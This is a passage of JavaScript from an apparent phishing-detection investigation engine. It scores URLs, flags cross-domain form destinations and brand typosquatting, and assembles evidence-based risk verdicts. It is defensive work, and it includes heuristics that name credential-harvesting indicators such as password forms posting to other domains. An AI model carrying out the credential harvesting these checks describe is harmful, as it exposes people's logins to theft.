            requestedActions: isAccessErrorDocument ? [] : intentAnalysis.requestedActions,
            requestedData: isAccessErrorDocument ? [] : intentAnalysis.requestedData,
            summary: isAccessErrorDocument
              ? { text: `HTTP ${httpProbe.statusCode} access-denial document captured; the target website's purpose could not be assessed.` }
              : intentAnalysis.summary
          },
          dataFlow: intentAnalysis.dataFlow,
          forms: pageExt.forms,
          scripts: pageExt.scripts,
          iframes: pageExt.iframes,
          links: pageExt.links,
          externalDomains: pageExt.externalDomains,
          domFingerprint: pageExt.domFingerprint,
          screenshotAvailable: Boolean((liveExtracted && liveExtracted.screenshotAvailable) || (icase.schema.liveInspection && icase.schema.liveInspection.screenshotCaptured)),
          renderStatus: icase.schema.renderStatus || 'RENDER_PARTIAL'
        };
        icase.schema.coverage.website = isAccessErrorDocument ? STAGE_STATUS.NOT_RUN : STAGE_STATUS.COMPLETED;
        icase.schema.coverage.network = STAGE_STATUS.COMPLETED;

        icase.log(isAccessErrorDocument
          ? `ACCESS ERROR DOCUMENT CAPTURED: HTTP ${httpProbe.statusCode}; target page intent/content not assessed.`
          : `PAGE EXCAVATED: ${pageExt.forms.length} forms, ${pageExt.scripts.length} scripts, ${pageExt.externalDomains.length} external domains | Intent: ${intentAnalysis.primary}`);
        
        if (!isAccessErrorDocument && (pageExt.forms.length > 0 || pageExt.scripts.length > 0)) {
          icase.addEvidence(
            demoConfig ? EVIDENCE_PROVENANCE.SIMULATED : EVIDENCE_PROVENANCE.OBSERVED,
            'page',
            `DOM Analysis: ${pageExt.forms.length} Form(s) & ${pageExt.scripts.length} Script(s)`,
            `Discovered ${pageExt.forms.length} form(s) and ${pageExt.scripts.length} script(s). DOM Fingerprint: ${pageExt.domFingerprint}`,
            pageExt
          );
        }

        // Add Intent Evidence
        if (!isAccessErrorDocument) icase.addEvidence(
          demoConfig ? EVIDENCE_PROVENANCE.SIMULATED : EVIDENCE_PROVENANCE.DERIVED,
          'page',
          `Page Intent Recognized: ${intentAnalysis.primary}`,
          `Identified Functional Intent: ${intentAnalysis.primary}${intentAnalysis.secondary ? ` (${intentAnalysis.secondary})` : ''} | Claimed: ${intentAnalysis.claimedPurpose} vs Observed: ${intentAnalysis.observedPurpose}. Requested Actions: [${intentAnalysis.requestedActions.join(', ') || 'NONE'}] | Sensitive Data: [${intentAnalysis.requestedData.join(', ') || 'NONE'}]`,
          intentAnalysis
        );

        // Check for Purpose Mismatch Breakpoint
        if (!isAccessErrorDocument && intentAnalysis.purposeMismatch) {
          icase.schema.trustBreakpoints.push({
            type: 'PURPOSE_MISMATCH',
            expected: intentAnalysis.claimedPurpose,
            observed: intentAnalysis.observedPurpose,
            description: intentAnalysis.mismatchReason
          });
          icase.addEvidence(
            demoConfig ? EVIDENCE_PROVENANCE.SIMULATED : EVIDENCE_PROVENANCE.INFERRED,
            'breakpoint',
            'Trust Breakpoint: Claimed vs Observed Purpose Mismatch',
            intentAnalysis.mismatchReason,
            { claimed: intentAnalysis.claimedPurpose, observed: intentAnalysis.observedPurpose }
          );
        }

        // Record cross-domain form destinations as indicators only. The page
        // may configure a destination, but Trust Layer never submits the form.
        for (const form of (isAccessErrorDocument ? [] : pageExt.forms)) {
          if (form.isExternal) {
            icase.schema.networkAnalysis.formSubmissions.push(form.action);
            icase.addGraphNode(`collector_${form.action}`, form.action, 'collector', { action: form.action });
            icase.addGraphEdge('target', `collector_${form.action}`, 'CROSS-DOMAIN FORM DESTINATION', 'association');
            icase.schema.trustBreakpoints.push({
              type: 'CROSS_DOMAIN_FORM_DESTINATION',
              expected: parsed.hostname,
              observed: form.action,
              description: `Observed form configuration points to a different domain (${form.destinationHost || 'unknown'}); no form data was submitted.`
            });
            // Keep the legacy simulated/non-browser ledger item for compatibility.
            // Completed Mode C DOM evidence is recorded once below with element
            // references and a separate inferred finding linked to its facts.
            if (demoConfig || icase.schema.inspectionMode !== INSPECTION_MODE.ISOLATED_LIVE) {
              icase.addEvidence(
                demoConfig ? EVIDENCE_PROVENANCE.SIMULATED : EVIDENCE_PROVENANCE.INFERRED,
                'page',
                'Content indicator: cross-domain form destination',
                'A form is configured to target a different domain. This alone does not establish malicious intent; no data was submitted.',
                { destinationHost: form.destinationHost, method: form.method, observedAt: Date.now() }
              );
            }
          }
        }

      } else if (httpProbe.status === 'NOT_RUN') {
        icase.schema.coverage.http = STAGE_STATUS.NOT_RUN;
        icase.schema.coverage.website = STAGE_STATUS.NOT_RUN;
        icase.schema.coverage.network = STAGE_STATUS.NOT_RUN;
        icase.schema.pageAnalysis.status = STAGE_STATUS.NOT_RUN;
        icase.schema.pageAnalysis.title = 'Page not inspected';
        icase.schema.pageAnalysis.headings = [];
        icase.schema.pageAnalysis.forms = [];
        icase.schema.pageAnalysis.scripts = [];
        icase.schema.pageAnalysis.screenshotAvailable = false;
        icase.schema.networkAnalysis.status = STAGE_STATUS.NOT_RUN;
        icase.log('MODE A: URL features and deterministic rules completed; target HTTP/page inspection was not run.');
        icase.addEvidence(EVIDENCE_PROVENANCE.DERIVED, 'meta', 'Page Inspection Not Run',
          'Mode A does not connect to the target. Use the consented redirect trace or isolated browser inspection for live observations.');
      } else {
        // HTTP Failed — Strictly record failure and DO NOT fabricate subsequent stages
        icase.schema.coverage.http = STAGE_STATUS.FAILED;
        icase.schema.coverage.website = STAGE_STATUS.NOT_RUN;
        icase.schema.coverage.network = STAGE_STATUS.NOT_RUN;
        icase.log(`HTTP RECONNAISSANCE FAILED: ${httpProbe.error}`, 'warn');
        icase.addEvidence(EVIDENCE_PROVENANCE.OBSERVED, 'http', 'HTTP Reconnaissance Failed',
          `Network probe could not reach target: ${httpProbe.error}. Website/DOM analysis unavailable.`,
          { error: httpProbe.error });

        // ── Fallback Intelligence Summary (unreachable target or unavailable inspector) ──
        // Populate pageAnalysis.intent so the UI always has a summary to display,
        // even when the target was offline or blocked.
        {
          const _ruleScore  = icase.schema.ruleEngineResult?.ruleScore || 0;
          const _ruleCls    = icase.schema.ruleEngineResult?.classification || 'UNKNOWN';
          const _modelProb  = icase.schema.modelResult?.probabilityPhishing;
          const _isPhish    = _ruleCls === 'PHISHING' || icase.schema.modelResult?.prediction === 'PHISHING';
          const _bps        = icase.schema.trustBreakpoints;
          const _isolationRefused = icase.schema.inspectionMode === INSPECTION_MODE.ISOLATED_LIVE &&
            icase.schema.liveInspection?.isolationReport?.runtimeMode === 'REFUSED_INSECURE_RUNTIME';
          const _unavailableTitle = _isolationRefused ? 'Isolated Renderer Unavailable' : `Unreachable Host (${parsed.hostname})`;
          const _unavailableReason = httpProbe.error || 'No HTTP response was observed.';

          const _bpLines = _bps.length > 0
            ? _bps.map(b => `  • ${b.type}: ${b.description}`).join('\n')
            : '  • No structural trust breakpoints triggered.';

          const _summaryText = [
            '===============================================================',
            _isolationRefused
              ? 'TARGET INTELLIGENCE SUMMARY (LIVE RENDERING REFUSED — ISOLATION UNAVAILABLE)'
              : 'TARGET INTELLIGENCE SUMMARY (PRE-EXECUTION / UNREACHABLE HOST)',
            '===============================================================',
            '',
            'WHAT THIS TARGET APPEARS TO BE (PRE-EXECUTION INFERENCE)',
            `Target URL:        ${parsed.normalizedUrl}`,
            `Inferred Role:     ${_isPhish ? 'SUSPICIOUS_CREDENTIAL_PORTAL' : 'EXTERNAL_WEB_RESOURCE'}`,
            `Network State:     ${httpProbe.statusText || 'HTTP PROBE FAILED'} (${_unavailableReason})`,
            `Rule Engine Score: ${_ruleScore} / 100 (${_ruleCls})`,
            `Model Phishing P:  ${_modelProb !== null && _modelProb !== undefined ? ((_modelProb * 100).toFixed(1) + '%') : 'N/A'}`,
            '',
            'OBSERVED THREAT BREAKPOINTS & ANOMALIES',
            _bpLines,
            '',
            'INSPECTION LIMITATIONS & UNKNOWNS',
            _isolationRefused
              ? 'Live webpage HTML and screenshot were not captured because the required isolated container runtime was unavailable; host-process browser fallback is prohibited.'
              : 'Live webpage HTML could not be retrieved because the destination host failed to respond to HTTP reconnaissance.',
            _isolationRefused
              ? 'Form fields, rendered content, network behaviour, and screenshot clues remain unobserved because no isolated browser ran.'
              : 'Form fields, input types, and potential submission routing remain unobserved due to host unreachability.',
            'Lexical risk score reflects high-confidence static URL indicators.',
            '==============================================================='
          ].join('\n');

          icase.schema.pageAnalysis = {
            status: STAGE_STATUS.FAILED,
            title: _unavailableTitle,
            domNodes: 0,
            htmlBytes: 0,
            headings: [_isolationRefused ? 'Isolated Renderer Unavailable' : 'HTTP Probe Unreachable', `Target Host: ${parsed.hostname}`],
            metaDescription: null,
            buttons: [],
            forms: [],
            scripts: [],
            iframes: [],
            links: [],
            externalDomains: [],
            domFingerprint: null,
            screenshotAvailable: Boolean(icase.schema.initialScreenshotUrl),
            dataFlow: null,
            intent: {
              primary: _isPhish ? 'SUSPICIOUS_PORTAL' : 'UNKNOWN',
              secondary: _isolationRefused ? 'ISOLATED_RENDERER_UNAVAILABLE' : 'UNREACHABLE_HOST',
              confidence: _isPhish ? 0.80 : 0.50,
              modelResult: null,
              ruleBaseline: _ruleCls,
              intentConsistency: 'INFERRED_FROM_LEXICAL',
              claimedPurpose: parsed.hostname,
              observedPurpose: _isolationRefused ? 'INSPECTION_UNAVAILABLE' : 'UNREACHABLE_HOST',
              purposeConsistency: 'INCOMPLETE',
              purposeMismatch: false,
              mismatchReason: null,
              requestedActions: [],
              requestedData: [],
              summary: {
                text: _summaryText,
                primaryIntent: _isPhish ? 'SUSPICIOUS_PORTAL' : 'UNKNOWN',
                primaryPageRole: _isPhish ? 'SUSPICIOUS_CREDENTIAL_PORTAL' : 'EXTERNAL_WEB_RESOURCE',
                availableActions: [],
                requestedData: []
              }
            }
          };
          icase.log('FALLBACK INTELLIGENCE: Pre-execution summary generated for unreachable host.');
        }
      }

      // ── Step 7: Identity & Entity Analysis ──
      icase.setStage(CASE_STATE.ENTITY_ANALYSIS);
      const host = parsed.hostname;
      const apexDomain = parsed.domain; // e.g. amazon.in, google.co.in, hdfcbank.com

      let claimedEntity = demoConfig ? demoConfig.claimedEntity : null;
      let observedEntity = host;
      let identityMismatch = false;

      // Legitimate major brand domain patterns across common TLDs/ccTLDs
      const KNOWN_LEGIT_BRANDS = [
        { name: 'Amazon', root: 'amazon' },
        { name: 'Google', root: 'google' },
        { name: 'PayPal', root: 'paypal' },
        { name: 'Microsoft', root: 'microsoft' },
        { name: 'Apple', root: 'apple' },
        { name: 'HDFC Bank', root: 'hdfcbank' },
        { name: 'ICICI Bank', root: 'icicibank' },
        { name: 'SBI', root: 'onlinesbi' },
        { name: 'Netflix', root: 'netflix' },
        { name: 'Wikipedia', root: 'wikipedia' }
      ];

      // Check if host matches legitimate brand apex domain
      let matchedBrand = null;
      for (const b of KNOWN_LEGIT_BRANDS) {
        if (apexDomain && apexDomain.startsWith(b.root + '.')) {
          matchedBrand = b.name;
          claimedEntity = b.name;
          observedEntity = host;
          icase.schema.identityAnalysis.claimedEntity = claimedEntity;
          icase.schema.identityAnalysis.observedEntity = observedEntity;
          icase.schema.identityAnalysis.identityContinuity = 'MATCH';
          icase.log(`IDENTITY CONFIRMED: ${claimedEntity} on authentic registered domain ${apexDomain}`);
          break;
        }
      }

      // Check for explicit typosquatting / lure spoofing vectors
      if (!matchedBrand) {
        if (demoConfig) {
          claimedEntity = demoConfig.claimedEntity;
          observedEntity = demoConfig.actualEntity;
          identityMismatch = true;
        } else {
          // Check for deceptive subdomain structure (e.g. brand.com.attacker.xyz)
          for (const b of KNOWN_LEGIT_BRANDS) {
            if (host.includes(b.root) && apexDomain && !apexDomain.startsWith(b.root + '.')) {
              claimedEntity = b.name;
              observedEntity = host;
              identityMismatch = true;
              break;
            }
          }
        }

        if (identityMismatch) {
          icase.schema.identityAnalysis.claimedEntity = claimedEntity;
          icase.schema.identityAnalysis.observedEntity = observedEntity;
          icase.schema.identityAnalysis.identityContinuity = 'MISMATCH';
          icase.schema.identityAnalysis.discontinuityReason = `Domain structure contains ${claimedEntity} brand token but resolves to unrelated apex domain "${apexDomain}".`;

          icase.schema.trustBreakpoints.push({
            type: 'IDENTITY_DISCONTINUITY',
            expected: `${claimedEntity} Official Domain`,
            observed: host,
            description: icase.schema.identityAnalysis.discontinuityReason
          });

          icase.addEvidence(
            demoConfig ? EVIDENCE_PROVENANCE.SIMULATED : EVIDENCE_PROVENANCE.INFERRED,
            'entity',
            `Identity Discontinuity: ${claimedEntity}`,
            icase.schema.identityAnalysis.discontinuityReason,
            { brand: claimedEntity, host, apexDomain }
          );
        } else {
          icase.schema.identityAnalysis.claimedEntity = 'UNKNOWN';
          icase.schema.identityAnalysis.observedEntity = host;
          icase.schema.identityAnalysis.identityContinuity = 'UNVERIFIED';
        }
      }

      icase.schema.coverage.identity = STAGE_STATUS.COMPLETED;

      // ── Step 8: Evidence Synthesis & Assessment State Machine ──
      icase.setStage(CASE_STATE.EVIDENCE_FINALIZATION);
      icase.schema.coverage.evidence = STAGE_STATUS.RUNNING;

      const hasHttpResponse = icase.schema.coverage.http === STAGE_STATUS.COMPLETED;
      const responseCode = Number(icase.schema.httpAnalysis?.statusCode) || null;
      const isHttpSuccess = hasHttpResponse && (responseCode === null || (responseCode >= 200 && responseCode < 400));
      const isAccessRestricted = icase.schema.accessStatus === 'BLOCKED_HTTP_403' || responseCode === 403;
      const isUrlOnlyPreliminary = icase.schema.inspectionMode === INSPECTION_MODE.URL_ONLY &&
        icase.schema.coverage.http === STAGE_STATUS.NOT_RUN;
      const modelProb = icase.schema.modelResult.probabilityPhishing || 0;
      const isModelPhish = icase.schema.modelResult.prediction === 'PHISHING';
      const isModelLegit = icase.schema.modelResult.prediction === 'LEGITIMATE';
      const hasIdentityMismatch = identityMismatch;
      const hasPurposeMismatch = icase.schema.pageAnalysis?.intent?.purposeMismatch || false;

      // A successful HTTP status or screenshot alone does not mean rendered
      // content was fully inspected. Require the worker's completed render
      // milestone and extracted DOM from the isolated browser.
      const fullRenderedInspection = hasCompleteRenderedEvidence({
        isAccessRestricted, isHttpSuccess, inspectionMode: icase.schema.inspectionMode,
        liveInspection: icase.schema.liveInspection, pageExtraction: liveExtracted
      });
      const contentAssessment = assessContentSignals({
        complete: fullRenderedInspection,
        pageExtraction: liveExtracted,
        networkEvents: icase.schema.liveInspection?.networkEvents || [],
        blockedRequests: icase.schema.liveInspection?.blockedRequests || [],
        visualFindings: icase.schema.screenshotIntelligence?.findings || [],
        redirectChain: icase.schema.liveInspection?.redirectChain || icase.schema.redirectAssessment?.redirectChain || [],
        targetUrl: parsed.normalizedUrl,
        finalUrl: icase.schema.liveInspection?.finalUrl || httpProbe?.finalUrl || parsed.normalizedUrl,
        identityMismatch: hasIdentityMismatch,
        purposeMismatch: hasPurposeMismatch,
        observedAt: Date.now()
      });
      // Keep inspected facts (DOM/network/redirect observations) separate in
      // the evidence ledger from heuristics inferred from those facts.
      recordContentEvidence(contentAssessment, (...args) => icase.addEvidence(...args));

      // Supporting evidence IDs
      const supportingIds = icase.schema.evidence.map(e => e.id);
      const missingEvidence = [];
      const limitations = [];

      if (!hasHttpResponse) {
        missingEvidence.push('HTTP_CONNECTION');
        limitations.push(isUrlOnlyPreliminary
          ? 'Target webpage was not fetched in Mode A; page content, redirects, and network behaviour remain unobserved.'
          : 'Target HTTP server could not be reached or inspected from the required execution environment.');
      }
      if (!isHttpSuccess) {
        missingEvidence.push('PAGE_CONTENT_ASSESSMENT');
        limitations.push(isAccessRestricted
          ? 'The endpoint returned HTTP 403. The captured document is an access-denial response; the target website content and purpose could not be assessed.'
          : (hasHttpResponse ? `The endpoint returned HTTP ${responseCode}; its response document does not establish the target website content.`
            : 'Page content and rendered website behavior were not available.'));
      }
      if (icase.schema.identityAnalysis.identityContinuity === 'UNVERIFIED') {
        missingEvidence.push('INDEPENDENT_ORGANIZATIONAL_REGISTRATION');
        limitations.push('Independent registrar certificate / organizational ownership records unverified.');
      }

      // Keep model predictions separate from observed/derived page indicators.
      if (isModelLegit && contentAssessment.signals.length > 0) {
        icase.schema.conflictDetected = true;
        icase.schema.conflictReason = 'URL model predicted LEGITIMATE while page inspection recorded one or more heuristic content indicators.';
        icase.log('CONFLICT DETECTED: Model/Evidence Conflict triggered', 'warn');
        icase.addEvidence(EVIDENCE_PROVENANCE.INFERRED, 'breakpoint', 'Model vs. Evidence Conflict',
          icase.schema.conflictReason);
      }

      // ── Rigorous Assessment State Machine ──

      // A malicious classification requires multiple independent, verified
      // observations. DOM configuration alone is never treated as a completed exfiltration.
      if (contentAssessment.outcome === 'MALICIOUS') {
        icase.schema.assessment.verificationState = VERIFICATION_STATE.HIGH_RISK_CONFIRMED;
        icase.schema.assessment.riskLevel = 'CRITICAL';
        icase.schema.assessment.headline = 'Corroborated malicious page evidence';
        icase.schema.assessment.summary = contentAssessment.summary;
        icase.schema.assessment.evidenceSufficient = true;
        icase.schema.assessment.reasons = [contentAssessment.summary];
      }
      // Structural/model/content indicators are suspicious, never verified fact.
      else if ((isModelPhish && modelProb >= 0.70) || icase.schema.ruleEngineResult?.classification === 'PHISHING' ||
        contentAssessment.outcome === 'SUSPICIOUS') {
        icase.schema.assessment.verificationState = VERIFICATION_STATE.HIGH_RISK_SUSPECTED;
        icase.schema.assessment.riskLevel = contentAssessment.outcome === 'SUSPICIOUS'
          ? contentAssessment.riskLevel : 'HIGH';
        icase.schema.assessment.headline = 'Suspicious indicators — not a confirmed page verdict';
        icase.schema.assessment.summary = contentAssessment.outcome === 'SUSPICIOUS'
          ? contentAssessment.summary
          : `URL rules/model indicate risk (${icase.schema.ruleEngineResult?.ruleScore ?? 'unavailable'} rule points); this is a prediction or heuristic, not verified page evidence.`;
        icase.schema.assessment.evidenceSufficient = false;
        icase.schema.assessment.reasons = contentAssessment.signals.map(signal => signal.description);
        if (!icase.schema.assessment.reasons.length) icase.schema.assessment.reasons = [icase.schema.assessment.summary];
      }
      // 3. HTTP Failed with Legitimate Model Signal: strictly INVESTIGATION_INCOMPLETE, NEVER confirmed or malicious
      else if (isAccessRestricted) {
        icase.schema.assessment.verificationState = VERIFICATION_STATE.UNVERIFIED;
        icase.schema.assessment.riskLevel = icase.schema.ruleEngineResult?.classification === 'UNDER_REVIEW' ? 'MODERATE' : 'LOW';
        icase.schema.assessment.headline = 'HTTP 403 Access Restriction — Site Content Unavailable';
        icase.schema.assessment.summary = 'The isolated browser received an HTTP 403 response and captured the access-denial document. This does not establish that the target site is phishing or safe; page content could not be assessed.';
        icase.schema.assessment.evidenceSufficient = false;
        icase.schema.assessment.reasons = ['HTTP 403 is an access restriction, not a phishing verdict.', 'Rendered screenshot documents the response; target website content remains unavailable.'];
      }
      else if (!isHttpSuccess && isUrlOnlyPreliminary) {
        icase.schema.assessment.verificationState = VERIFICATION_STATE.UNVERIFIED;
        icase.schema.assessment.riskLevel = icase.schema.ruleEngineResult?.classification === 'UNDER_REVIEW' ? 'MODERATE' : 'LOW';
        icase.schema.assessment.headline = 'Initial URL Assessment — Webpage Not Fetched';
        icase.schema.assessment.summary = 'URL structure and deterministic rules were assessed. Redirects and page content were not inspected, so this is not a final website safety verdict.';
        icase.schema.assessment.evidenceSufficient = false;
        icase.schema.assessment.reasons = ['Mode A made no HTTP request to the target.', 'Page content, redirects, and screenshot evidence are not available until a live mode is explicitly run.'];
      }
      else if (!isHttpSuccess) {
        icase.schema.assessment.verificationState = VERIFICATION_STATE.INVESTIGATION_INCOMPLETE;
        icase.schema.assessment.riskLevel = 'LOW';
        icase.schema.assessment.headline = isModelLegit
          ? 'Model Indication (Legitimate) — Live Inspection Incomplete'
          : 'Inconclusive Signals — Live Inspection Incomplete';
        icase.schema.assessment.summary = `The requested live inspection did not complete. ${icase.schema.httpAnalysis.error || 'No sufficient network/page evidence was collected.'}`;
        icase.schema.assessment.evidenceSufficient = false;
        icase.schema.assessment.reasons = [
          'No confirmed threat can be established from the available evidence.',
          icase.schema.httpAnalysis.error || 'Live page evidence could not be collected.'
        ];
      }
      // Clean-looking URLs and legitimate model predictions cannot complete a
      // page assessment; only a complete rendered inspection can report absence
      // of indicators, and that still is not a universal safety assertion.
      else if (contentAssessment.outcome === 'NO_THREAT_DETECTED') {
        icase.schema.assessment.verificationState = VERIFICATION_STATE.UNVERIFIED;
        icase.schema.assessment.riskLevel = 'LOW';
        icase.schema.assessment.headline = 'No threat indicators detected in completed checks';
        icase.schema.assessment.summary = contentAssessment.summary;
        icase.schema.assessment.evidenceSufficient = false;
        icase.schema.assessment.reasons = [contentAssessment.summary];
      }
      // 5. Default Fallback: Unverified
      else {
        icase.schema.assessment.verificationState = VERIFICATION_STATE.UNVERIFIED;
        icase.schema.assessment.riskLevel = 'MODERATE';
        icase.schema.assessment.headline = 'Inconclusive Signals — Additional Evidence Required';
        icase.schema.assessment.summary = 'Available signals are insufficient to confirm or rule out fraud.';
        icase.schema.assessment.evidenceSufficient = false;
        icase.schema.assessment.reasons = ['Investigation completed with mixed/uncertain signals.'];
      }

      icase.schema.assessment.supporting_evidence_ids = supportingIds;
      icase.schema.assessment.missing_evidence = missingEvidence;
      icase.schema.assessment.limitations = limitations;

      const screenshotIntelligence = icase.schema.screenshotIntelligence || null;
      const fixturePageText = [icase.schema.pageAnalysis?.title, icase.schema.pageAnalysis?.metaDescription,
        ...(icase.schema.pageAnalysis?.headings || [])].filter(Boolean).join(' ');
      const isSecurityTestFixture = screenshotIntelligence?.indicators?.isSecurityTestFixture === true ||
        (/phishing\s*page\s*example/i.test(fixturePageText) &&
          /(test page|safe browsing|social engineering content example)/i.test(fixturePageText));
      icase.schema.urlRiskAssessment = {
        ruleScore: icase.schema.ruleEngineResult?.ruleScore ?? 0,
        classification: icase.schema.ruleEngineResult?.classification || 'UNAVAILABLE',
        outcome: 'UNVERIFIED', scope: 'URL_STRUCTURE_ONLY', isPreliminary: true,
        provenance: 'URL_RULES', confidenceLevel: 'LOW', timestamp: icase.schema.ruleEngineResult?.timestamp || Date.now(),
        summary: `Preliminary URL-structure assessment: ${icase.schema.ruleEngineResult?.classification || 'UNAVAILABLE'} (${icase.schema.ruleEngineResult?.ruleScore ?? 0}/100); this is not a page verdict.`
      };
      icase.schema.pageContentAssessment = {
        status: fullRenderedInspection ? 'COMPLETED' : (isHttpSuccess ? 'PARTIAL'
          : (isAccessRestricted ? 'CONTENT_UNAVAILABLE' : (hasHttpResponse ? 'HTTP_ERROR_DOCUMENT' : 'NOT_RUN'))),
        fullRenderedInspection,
        accessStatus: icase.schema.accessStatus || (hasHttpResponse ? 'HTTP_RESPONSE' : 'NO_RESPONSE'),
        renderStatus: icase.schema.renderStatus || 'RENDER_UNKNOWN',
        screenshotStatus: icase.schema.screenshotStatus || 'NOT_CAPTURED',
        outcome: contentAssessment.outcome,
        verdict: contentAssessment.outcome === 'MALICIOUS' ? 'PHISHING'
          : (contentAssessment.outcome === 'SUSPICIOUS' ? 'UNDER_REVIEW' : null),
        riskLevel: contentAssessment.riskLevel,
        confidenceLevel: contentAssessment.confidenceLevel,
        observations: contentAssessment.observations,
        signals: contentAssessment.signals,
        summary: contentAssessment.summary,
        hasExternalSensitiveFormDestination: contentAssessment.signals.some(signal => signal.code === 'SENSITIVE_FORM_CROSS_DOMAIN_DESTINATION'),
        hasCredentialsTrap: formsFound.some(form => form.hasPassword || form.hasSensitive) ||
          screenshotIntelligence?.indicators?.hasCredentialsPrompt === true,
        hasFakeSoftwareUpdate: screenshotIntelligence?.indicators?.hasFakeSoftwareUpdate === true,
        isSecurityTestFixture,
        screenshotCluesCount: screenshotIntelligence?.findings?.length || 0
      };
      const overall = OverallRiskAggregator.aggregate({
        urlAssessment: icase.schema.urlRiskAssessment,
        redirectAssessment: icase.schema.redirectAssessment,
        pageContentAssessment: icase.schema.pageContentAssessment,
        isTestFixture: isSecurityTestFixture,
        hasIdentityMismatch,
        inspectionMode: icase.schema.inspectionMode || 'URL_ONLY',
        modelPrediction: icase.schema.modelResult.prediction,
        modelProbability: icase.schema.modelResult.probabilityPhishing,
        modelConfidenceLevel: icase.schema.modelResult.confidenceLevel
      });
      icase.schema.overallAssessment = overall;
      icase.schema.assessment.verdict = overall.finalVerdict;
      if (overall.finalVerdict === 'KNOWN_SECURITY_TEST_FIXTURE') {
        icase.schema.assessment.verificationState = VERIFICATION_STATE.KNOWN_SECURITY_TEST_FIXTURE;
      } else if (overall.finalVerdict === 'PHISHING') {
        icase.schema.assessment.verificationState = overall.verifiedThreat
          ? VERIFICATION_STATE.HIGH_RISK_CONFIRMED
          : VERIFICATION_STATE.HIGH_RISK_SUSPECTED;
      } else if (overall.finalVerdict === 'UNDER_REVIEW') {
        icase.schema.assessment.verificationState = VERIFICATION_STATE.UNVERIFIED;
      } else if (overall.finalVerdict === 'NO_THREAT_OBSERVED') {
        icase.schema.assessment.verificationState = VERIFICATION_STATE.UNVERIFIED;
        icase.schema.assessment.evidenceSufficient = false;
      } else icase.schema.assessment.verificationState = VERIFICATION_STATE.UNVERIFIED;
      icase.schema.assessment.riskLevel = overall.finalRiskLevel;
      icase.schema.assessment.headline = overall.headline;
      icase.schema.assessment.summary = overall.summary;
      icase.schema.assessment.determiningComponent = overall.determiningComponent;
      icase.schema.assessment.combinedScore = overall.combinedScore;

      // Deception Path
      if (hasIdentityMismatch && claimedEntity) {
        icase.schema.deceptionPath = {
          perceived: [
            { step: 'Brand Lure', label: `${claimedEntity} Portal`, icon: '🏦' },
            { step: 'Authentication Request', label: 'Legitimate Verification Form', icon: '🔐' },
            { step: 'Expected Outcome', label: 'Authorized Session', icon: '✅' }
          ],
          actual: [
            { step: 'Unverified Domain', label: host, icon: '🎭', risk: 'critical' },
            { step: 'Configured Form Destination', label: icase.schema.networkAnalysis.formSubmissions[0] || 'Not observed', icon: '📤', risk: 'moderate' },
            { step: 'Outcome', label: 'Unverified — no form submission was performed', icon: '❔', risk: 'moderate' }
          ]
        };
      }

      // Attack Story
      icase.schema.attackStory = [
        `1. Target "${parsed.normalizedUrl}" analyzed by URL Intelligence (${(modelProb * 100).toFixed(1)}% P(Phishing)).`,
        isHttpSuccess
          ? `2. HTTP recon established connection (${icase.schema.httpAnalysis.statusCode} in ${icase.schema.httpAnalysis.latencyMs}ms).`
          : `2. HTTP recon failed (${icase.schema.httpAnalysis.error || 'unreachable'}).`,
        icase.schema.trustBreakpoints.length > 0
          ? `3. Trust Breakpoint observed: ${icase.schema.trustBreakpoints[0].description}.`
          : `3. No trust boundaries broken in transaction chain.`,
        `4. Final Assessment: ${icase.schema.assessment.headline}.`
      ];

      // Campaign Relationship Memory (Section 11)
      const campaignMatches = InvestigationEngine.findRelatedCampaigns(icase);
      icase.schema.relatedCampaigns = campaignMatches;
      if (campaignMatches.hasMatches) {
        icase.addEvidence(
          EVIDENCE_PROVENANCE.DERIVED,
          'entity',
          'Correlated Campaign Relationship Detected',
          `Identified ${campaignMatches.matches.length} prior case(s) sharing technical infrastructure (e.g. form actions or script patterns).`,
          campaignMatches
        );
      }

      // ── Step 8.5: Synthesize 8-Question Website Intelligence Summary ──
      const intelSummary = IntelligenceSummaryBuilder.build(icase.schema, icase.schema.inspectionMode || 'URL_ONLY');
      icase.schema.intelligenceSummary = intelSummary;
      if (icase.schema.pageAnalysis?.intent) {
        icase.schema.pageAnalysis.intent.summary = {
          text: intelSummary.overallText,
          primaryIntent: icase.schema.pageAnalysis.intent.primary,
          primaryPageRole: icase.schema.pageAnalysis.intent.primary,
          availableActions: icase.schema.pageAnalysis.buttons || [],
          requestedData: icase.schema.pageAnalysis.intent.requestedData || []
        };
      }

      icase.schema.coverage.evidence = STAGE_STATUS.COMPLETED;
      icase.schema.status = (hasHttpResponse || isUrlOnlyPreliminary) ? CASE_STATE.COMPLETED : CASE_STATE.INCOMPLETE;
      if (icase.schema.lifecycleState !== 'cancelled') {
        icase.schema.lifecycleState = (icase.schema.renderStatus === 'RENDER_TIMEOUT' || icase.schema.liveInspection?.status === 'TIMEOUT') ? 'timed_out'
          : (icase.schema.status === CASE_STATE.COMPLETED ? 'completed' : 'failed');
      }
      icase.schema.completedAt = Date.now();
      if (icase.schema.modeCTimings) icase.schema.modeCTimings.total_investigation_ms = icase.schema.completedAt - icase.schema.createdAt;
      if (icase.schema.modeCTimings) icase.log(`MODE C FINAL TIMINGS (ms): ${JSON.stringify(icase.schema.modeCTimings)}`);
      InvestigationEngine.CASE_HISTORY.set(icase.id, icase.schema);
      icase.log(`CASE FINALIZED: Status=${icase.schema.status} | Assessment=${icase.schema.assessment.headline}`);
      icase.emit('complete', icase.schema);

    } catch (err) {
      const wasCancelled = icase.schema.lifecycleState === 'cancelled' || icase._abortSignal?.aborted;
      icase.schema.status = wasCancelled ? CASE_STATE.INCOMPLETE : CASE_STATE.FAILED;
      icase.schema.lifecycleState = wasCancelled ? 'cancelled' : 'failed';
      icase.schema.completedAt = Date.now();
      icase.schema.errors.push('Investigation could not be completed.');
      if (icase.schema.modeCTimings) icase.schema.modeCTimings.total_investigation_ms = Date.now() - icase.schema.createdAt;
      icase.log('INVESTIGATION ERROR: internal processing failure', 'error');
      icase.emit('error', { error: 'Investigation could not be completed.' });
      icase.emit('complete', icase.schema);
    }

    return icase;
  }

  /**
   * Discovers shared infrastructural patterns across previous investigations (Section 11)
   */
  static findRelatedCampaigns(icase) {
    const currentHost = icase.schema.urlAnalysis?.hostname || '';
    const currentForms = icase.schema.networkAnalysis?.formSubmissions || [];
    const currentScripts = (icase.schema.websiteAnalysis?.scripts || []).map(s => s.src).filter(Boolean);

    const matches = [];

    for (const [pastId, pastSchema] of InvestigationEngine.CASE_HISTORY.entries()) {
      if (pastId === icase.id) continue;
      const sharedFeatures = [];

      // 1. Shared form submission endpoint
      const pastForms = pastSchema.networkAnalysis?.formSubmissions || [];
      const sharedForms = currentForms.filter(f => pastForms.includes(f));
      if (sharedForms.length > 0) {
